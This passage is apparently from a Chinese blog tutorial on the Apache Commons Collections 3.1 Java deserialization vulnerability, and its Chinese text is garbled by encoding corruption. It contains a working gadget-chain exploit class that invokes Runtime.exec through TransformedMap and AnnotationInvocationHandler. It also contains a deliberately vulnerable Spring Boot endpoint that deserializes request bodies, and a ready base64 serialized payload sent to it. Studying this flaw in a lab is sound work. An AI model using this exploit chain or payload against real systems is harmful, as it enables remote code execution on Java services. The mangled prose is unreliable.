ä¼šè¢«è½¬æ¢ä¸º AbstractInputCheckedMapDecorator.MapEntry Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // AbstractInputCheckedMapDecorator.MapEntry åœ¨ setValue æ—¶ä¼šå…ˆè°ƒç”¨ parent.checkSetValue(value)ï¼Œè€Œ checkSetValue ä¼šè°ƒç”¨ valueTransformer çš„ transform æ–¹æ³• outerMap.put(\u0026#34;name\u0026#34;, \u0026#34;æ³•å¤–ç‹‚å¾’å¼ ä¸‰\u0026#34;); } } ç¬‘é‡Œè—åˆ€ ç°åœ¨åªå·®æœ€åä¸€æ­¥ï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œç”¨å®ƒåˆ›å»ºä¸€ä¸ªå¯¹è±¡å¹¶å®Œæˆåºåˆ—åŒ–ï¼ŒåŒæ—¶å®ƒè¿˜å¿…é¡»æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ï¼š\nå®ç°äº† Serializable æ¥å£ã€‚ å¢åŠ äº† readObject æ–¹æ³•ã€‚ æˆå‘˜å˜é‡ä¸­æœ‰ Map å¹¶ä¸”åœ¨ readObject æ—¶å¯¹è¿™ä¸ª Map è¿›è¡Œäº† put æ“ä½œæˆ–æ“ä½œäº† Map.Entry çš„ setValue æ–¹æ³•ã€‚ å®‰å…¨äººå‘˜åœ¨å®¡æŸ¥ openjdk æºç æ—¶å‘ç°äº† sun.reflect.annotation.AnnotationInvocationHandlerè¿™ä¸ªç±» ç¬¦åˆè¿™ä¸ªæ¡ä»¶ï¼Œåªéœ€ç”¨è¿™ä¸ªç±»åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå†å°†å…¶åºåˆ—åŒ–ä¹‹åçš„å†…å®¹å‘é€åˆ°å…¶ä»–ç³»ç»Ÿï¼Œå³å¯å®Œæˆæ¼æ´åˆ©ç”¨ã€‚\nä½†åªå±€é™äºä»¥ä¸‹è¿™å‡ ä¸ªç‰ˆæœ¬\nopenjdk 8 https://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u20 https://hg.openjdk.java.net/jdk8u/jdk8u20/jdk/file/f5d77a430a29/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u40 https://hg.openjdk.java.net/jdk8u/jdk8u40/jdk/file/c7bbaa04eaa8/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u41 https://hg.openjdk.java.net/jdk8u/jdk8u41/jdk/file/4f0378ee824a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java openjdk 8u60 https://hg.openjdk.java.net/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java å…¶ readObject æ–¹æ³•å¦‚ä¸‹\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : memberValues.entrySet()) { // debug å‘ç°è¿™ä¸ª name æ˜¯ä¸€ä¸ªå›ºå®šå€¼ \u0026#34;value\u0026#34; String name = memberValue.getKey(); Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { // ä¸‹é¢è¿™è¡Œä»£ç ä¼šè§¦å‘ memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name))); } } } } å®‰å…¨äººå‘˜åœ¨ debug æ—¶å‘ç° Map ä¸­çš„ key ä¸ºå›ºå®šå€¼ \u0026quot;value\u0026quot; ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°† Map ä¸­çš„ key ä¿®æ”¹ä¸ºå­—ç¬¦ä¸² \u0026quot;value\u0026quot;ï¼Œä¸‹é¢æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ª payloadã€‚\nimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class Exp3 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[2]), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }; Transformer transformerChain = ChainedTransformer.getInstance(transformers); // åˆ©ç”¨ TransformedMap çš„æ¼æ´æ¥æ‰§è¡Œ transform æ–¹æ³• Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;å®ˆæ³•å¸‚æ°‘å°æœ\u0026#34;); // TransformedMap ç»§æ‰¿è‡ª AbstractInputCheckedMapDecoratorï¼ŒMap ä¸­çš„ å…ƒç´ ä¼šè¢«è½¬æ¢ä¸º AbstractInputCheckedMapDecorator.MapEntry Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); // AbstractInputCheckedMapDecorator.MapEntry åœ¨ setValue æ—¶ä¼šå…ˆè°ƒç”¨ parent.checkSetValue(value)ï¼Œè€Œ checkSetValue ä¼šè°ƒç”¨ valueTransformer çš„ transform æ–¹æ³• // outerMap.put(\u0026#34;value\u0026#34;, \u0026#34;æ³•å¤–ç‹‚å¾’å¼ ä¸‰\u0026#34;); // AnnotationInvocationHandler ä¸æ˜¯ public ç±»å‹çš„ç±»ï¼Œä¸”æ²¡æœ‰å…¬å¼€çš„æ„é€ å™¨æ–¹æ³•ï¼Œåªèƒ½é€šè¿‡åå°„åˆ›å»º Class\u0026lt;?\u0026gt; cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); // è·å–æ„é€ æ–¹æ³• Constructor\u0026lt;?\u0026gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class); // å› ä¸ºå…¶æ„é€ æ–¹æ³•ä¸æ˜¯ public constructor.setAccessible(true); // å®ä¾‹åŒ–å¯¹è±¡ Object target = constructor.newInstance(Target.class, outerMap); // å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.writeObject(target); } // å°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ– final String data = Base64.getEncoder().encodeToString(buffer.toByteArray()); System.out.println(\u0026#34;payload: \u0026#34; + data); } } ä½¿ç”¨ maven æ–°å»ºä¸€ä¸ª springboot é¡¹ç›®æ¥æ¨¡æ‹Ÿç›®æ ‡ç¯å¢ƒï¼Œæ·»åŠ  commons-collections 3.1 çš„ä¾èµ–ï¼Œå¹¶å¢åŠ ä¸€ä¸ªæ¥å£å¦‚ä¸‹ï¼š\nimport org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RestController; import javax.servlet.ServletInputStream; import javax.servlet.http.HttpServletRequest; import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; @RestController @SpringBootApplication public class Application { public static void main(String[] args) { SpringApplication.run(Application.class, args); } /** * apache commons-collections 3.1 ç‰ˆæœ¬çš„ååºåˆ—åŒ–æ¼æ´ * * @param request request * @return æ˜¯å¦æˆåŠŸ * @throws Exception å¼‚å¸¸ */ @PostMapping(\u0026#34;/commons-collections-3.1\u0026#34;) public String commonsCollections3_1(HttpServletRequest request) throws Exception { ServletInputStream inputStream = request.getInputStream(); final StringBuilder sb = new StringBuilder(); try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) { char[] charBuffer = new char[1024]; int bytesRead; while ((bytesRead = bufferedReader.read(charBuffer)) \u0026gt; 0) { sb.append(charBuffer, 0, bytesRead); } } // è¯»å– request body ä¸­çš„å­—ç¬¦ä¸² final String requestBody = sb.toString(); // ä½¿ç”¨ base64 è§£ç  final byte[] bytes = Base64.getDecoder().decode(requestBody.getBytes(StandardCharsets.UTF_8)); // å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–ä¸ºå¯¹è±¡ ByteArrayInputStream b = new ByteArrayInputStream(bytes); try (ObjectInputStream input = new ObjectInputStream(b)) { Object obj = input.readObject(); System.out.println(obj); } return \u0026#34;success\u0026#34;; } } å¯åŠ¨ springboot æœåŠ¡ã€‚\næœ€åå¢åŠ ä¸€ä¸ªå‘é€ http è¯·æ±‚çš„æµ‹è¯•ï¼Œæ­¤æ­¥éª¤å¯ä»¥æ¢postman æˆ–è€… burpï¼Œæˆ‘è¿™é‡Œæ˜¯ä½¿ç”¨äº† IDEA è‡ªå¸¦çš„ http è¯·æ±‚å·¥å…·è¿›è¡Œæµ‹è¯•\n### å‘é€POST è¯·æ±‚ POST http://localhost:8080/commons-collections-3.1 rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwcHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABpzcQB+ABF1cQB+ABYAAAACcHB0AAZpbnZva2V1cQB+ABoAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAWc3EAfgARdXEAfgAWAAAAAXQABGNhbGN0AARleGVjdXEAfgAaAAAAAXEAfgAdc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAV2YWx1ZXQAEuWuiOazleW4guawkeWwj+adnHh4dnIAG2phdmEubGFuZy5hbm5vdGF0aW9uLlRhcmdldAAAAAAAAAAAAAAAeHA= è¯·æ±‚å‘é€æˆåŠŸï¼Œä¾¿å¯ä»¥çœ‹åˆ°ç”µè„‘æ‰“å¼€äº†è®¡ç®—å™¨ã€‚\næ³¨ æ–‡ä¸­æµ‹è¯•ä½¿ç”¨ç³»ç»Ÿå’Œå·¥å…·ç‰ˆæœ¬å¦‚ä¸‹ï¼š\næ“ä½œç³»ç»Ÿ windows 10 20H2 jdk openjdk 8u40 springboot 2.5.5 commons-collections 3.1 ä»£ç ä»“åº“ https://github.com/dushixiang/java-serialization-vulnerability å…¶ä»– åœ¨æœ€æ–°çš„ openjdk 8u ä¸­åˆ™ä¿®å¤äº†è¿™ä¸ªé—®é¢˜ï¼Œä»£ç å¦‚ä¸‹ï¼š\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { ... çœç•¥ Map\u0026lt;String, Class\u0026lt;?\u0026gt;\u0026gt; memberTypes = annotationType.memberTypes(); // consistent with runtime Map type Map\u0026lt;String, Object\u0026gt; mv = new LinkedHashMap\u0026lt;\u0026gt;(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry\u0026lt;String, Object\u0026gt; memberValue : streamVals.entrySet()) { String name = memberValue.getKey(); Object value = null; Class\u0026lt;?\u0026gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { value = new AnnotationTypeMismatchExceptionProxy( value.getClass() + \u0026#34;[\u0026#34; + value + \u0026#34;]\u0026#34;).setMember( annotationType.members().get(name)); } } mv.put(name, value); } UnsafeAccessor.setType(this, t); UnsafeAccessor.setMemberValues(this, mv); } https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/6f1875b6f29f/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java\nå·²ç»ä¸å†èƒ½å¤Ÿè§¦å‘ transform ã€‚\nå‚è€ƒ https://github.com/Cryin/Paper/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88.md\nhttps://xz.aliyun.com/t/7031#toc-10\n","permalink":"https://www.typesafe.cn/posts/java-serialization-vulnerability-1/","summary":"\u003ch2 id=\"å£°æ˜\"\u003eå£°æ˜\u003c/h2\u003e\n\u003cp\u003eæœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚\u003c/p\u003e\n\u003ch2 id=\"åºåˆ—åŒ–çš„å®šä¹‰\"\u003eåºåˆ—åŒ–çš„å®šä¹‰\u003c/h2\u003e\n\u003cp\u003eåºåˆ—åŒ–æ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå¯å–ç”¨æ ¼å¼ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½æ¢å¤åŸå…ˆçŠ¶æ€çš„è¿‡ç¨‹ã€‚ä¾ç…§åºåˆ—åŒ–æ ¼å¼é‡æ–°è·å–å­—èŠ‚çš„ç»“æœæ—¶ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥äº§ç”Ÿä¸åŸå§‹å¯¹è±¡ç›¸åŒè¯­ä¹‰çš„å‰¯æœ¬ã€‚\u003c/p\u003e\n\u003ch2 id=\"java-ä¸­çš„åºåˆ—åŒ–\"\u003eJava ä¸­çš„åºåˆ—åŒ–\u003c/h2\u003e\n\u003cp\u003eJava è‡ªèº«æä¾›äº†åºåˆ—åŒ–çš„åŠŸèƒ½ï¼Œéœ€è¦å®ç° \u003ccode\u003ejava.io.Serializable\u003c/code\u003e æ¥å£ï¼Œæ ‡æ˜è¯¥å¯¹è±¡æ˜¯å¯åºåˆ—åŒ–çš„ã€‚ \u003ccode\u003ejava.io.Serializable\u003c/code\u003e æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œä¸éœ€è¦å¯¹è±¡å®ç°æ–¹æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œå±•ç¤ºäº†ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.io.*;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.nio.charset.StandardCharsets;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e java.util.Base64;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eEval0\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estatic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eclass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eCommand\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eimplements\u003c/span\u003e Serializable {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e String cmd;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e String \u003cspan style=\"color:#a6e22e\"\u003egetCmd\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e cmd;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esetCmd\u003c/span\u003e(String cmd) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ethis\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ecmd\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e cmd;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estatic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(String\u003cspan style=\"color:#f92672\"\u003e[]\u003c/span\u003e args) \u003cspan style=\"color:#66d9ef\"\u003ethrows\u003c/span\u003e Exception {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// å®šä¹‰ä¸€ä¸ªå¯¹è±¡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Command command \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e Command();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        command.\u003cspan style=\"color:#a6e22e\"\u003esetCmd\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;calc\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        System.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;åºåˆ—åŒ–å‰: \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e command.\u003cspan style=\"color:#a6e22e\"\u003egetCmd\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// å°†ç”¨æˆ·åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ByteArrayOutputStream buffer \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e ByteArrayOutputStream();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e (ObjectOutputStream outputStream \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e ObjectOutputStream(buffer)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            outputStream.\u003cspan style=\"color:#a6e22e\"\u003ewriteObject\u003c/span\u003e(command);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// å°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ–\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efinal\u003c/span\u003e String data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Base64.\u003cspan style=\"color:#a6e22e\"\u003egetEncoder\u003c/span\u003e().\u003cspan style=\"color:#a6e22e\"\u003eencodeToString\u003c/span\u003e(buffer.\u003cspan style=\"color:#a6e22e\"\u003etoByteArray\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        System.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;åºåˆ—åŒ–å: \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e data);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// å°†base64ç¼–ç çš„æ•°æ®å†è§£ç ä¸ºå­—èŠ‚æ•°ç»„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efinal\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e[]\u003c/span\u003e bytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Base64.\u003cspan style=\"color:#a6e22e\"\u003egetDecoder\u003c/span\u003e().\u003cspan style=\"color:#a6e22e\"\u003edecode\u003c/span\u003e(data.\u003cspan style=\"color:#a6e22e\"\u003egetBytes\u003c/span\u003e(StandardCharsets.\u003cspan style=\"color:#a6e22e\"\u003eUTF_8\u003c/span\u003e));\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e// å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–ä¸ºå¯¹è±¡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ByteArrayInputStream b \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e ByteArrayInputStream(bytes);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e (ObjectInputStream input \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enew\u003c/span\u003e ObjectInputStream(b)) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003efinal\u003c/span\u003e Command obj \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (Command) input.\u003cspan style=\"color:#a6e22e\"\u003ereadObject\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            System.\u003cspan style=\"color:#a6e22e\"\u003eout\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eprintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ååºåˆ—åŒ–: \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e obj.\u003cspan style=\"color:#a6e22e\"\u003egetCmd\u003c/span\u003e());\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    